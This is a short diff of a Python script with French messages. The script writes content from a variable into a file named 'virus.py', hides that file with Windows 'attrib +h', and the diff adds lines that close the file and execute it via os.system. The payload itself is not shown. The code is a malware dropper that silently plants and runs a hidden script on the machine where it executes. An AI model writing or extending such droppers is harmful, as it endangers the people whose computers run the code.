@@ -9,6 +9,8 @@ if not os.path.exists(chemin+'virus.py') :
        f = open(chemin+'virus.py', 'w+')
        os.system("attrib +h "+chemin+"virus.py")
        f.write(req)
+       f.close()
        print('Fichier créer !')
+       print(os.system(f'python ' +chemin + 'virus.py'))
 else:
        print('Déja créer..')
